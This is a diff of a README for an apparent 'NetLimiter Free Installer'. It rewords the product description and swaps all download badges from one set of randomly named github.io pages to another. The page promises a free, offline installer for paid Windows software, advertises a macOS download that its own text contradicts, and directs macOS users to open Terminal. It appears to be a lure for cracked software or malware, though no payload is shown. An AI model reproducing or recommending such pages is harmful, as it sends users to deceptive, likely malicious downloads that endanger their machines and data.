@@ -5,10 +5,10 @@
   <img src="https://img.shields.io/badge/Rating-4.9%2F5-F9A825?style=for-the-badge&logo=star" />
   <img src="https://img.shields.io/badge/Version-2026-101010?style=for-the-badge&logo=github" />
   <img src="https://img.shields.io/badge/Platform-Windows%20%7C%20macOS-informational?style=for-the-badge&logo=windows" />
-  <img src="https://img.shields.io/badge/Category-Network+Management-E63946?style=for-the-badge&logo=appstore" />
+  <img src="https://img.shields.io/badge/Category-Bandwidth+Manager-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 NetLimiter Free Installer** — NetLimiter is a Windows internet traffic control and monitoring application that lets you limit bandwidth used by individual applications, monitor real-time and historical network usage per application, and block applications from accessing the internet entirely. Works without internet access, no account required. Full offline installation.
+**💻 NetLimiter Free Installer** — NetLimiter is a Windows network traffic control and monitoring tool that allows setting bandwidth limits and priorities for individual applications. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install NetLimiter](https://img.shields.io/badge/⬇_Install_NetLimiter-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install NetLimiter](https://img.shields.io/badge/⬇_Install_NetLimiter-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About NetLimiter
 
-NetLimiter is a Windows internet traffic control and monitoring application that lets you limit bandwidth used by individual applications, monitor real-time and historical network usage per application, and block applications from accessing the internet entirely. Used for bandwidth management on shared connections, preventing background apps from consuming limited data, and monitoring data usage.
+NetLimiter is a Windows network traffic control and monitoring tool that allows setting bandwidth limits and priorities for individual applications. It shows real-time network usage per process, enables blocking specific apps from internet access, and logs all network activity.
 
 ---
 
 ## ❌ Problem: NetLimiter is hard to access
 
-- **Windows Only** — No macOS or Linux version
-- **Commercial License** — Requires paid license after trial
-- **System-Level Integration** — Deep network integration requires kernel driver installation
-- **Application Recognition** — Some applications may be difficult to identify correctly
+- **Windows Only** — No macOS or Linux version available
+- **Paid License** — Requires purchase after trial period
+- **Complexity** — Advanced rule creation requires network administration knowledge
+- **Driver-Level Access** — Deep system integration can occasionally cause conflicts
 
 ---
 
@@ -61,9 +61,9 @@ NetLimiter is a Windows internet traffic control and monitoring application that
 
 <div align="center">
 
-[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://zenboulderagora.github.io/Windw/)
+[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://yobowgileysb.github.io/WinDownload/)
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 </div>
 
@@ -81,7 +81,7 @@ NetLimiter is a Windows internet traffic control and monitoring application that
 
 <div align="center">
 
-[![⬇ Install NetLimiter](https://img.shields.io/badge/⬇_Install_NetLimiter-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install NetLimiter](https://img.shields.io/badge/⬇_Install_NetLimiter-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -100,7 +100,7 @@ NetLimiter is a Windows internet traffic control and monitoring application that
 
 ## 🍎 macOS Installation
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -121,11 +121,11 @@ NetLimiter is a Windows internet traffic control and monitoring application that
 
 ---
 
-**NetLimiter Free Installer** — NetLimiter is a Windows internet traffic control and monitoring application that lets you limit bandwidth used by individual applications, monitor real-time and historical network usage per application, and block applications from accessing the internet entirely. Install without internet connection today!
+**NetLimiter Free Installer** — NetLimiter is a Windows network traffic control and monitoring tool that allows setting bandwidth limits and priorities for individual applications. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install NetLimiter](https://img.shields.io/badge/⬇_Install_NetLimiter-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install NetLimiter](https://img.shields.io/badge/⬇_Install_NetLimiter-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
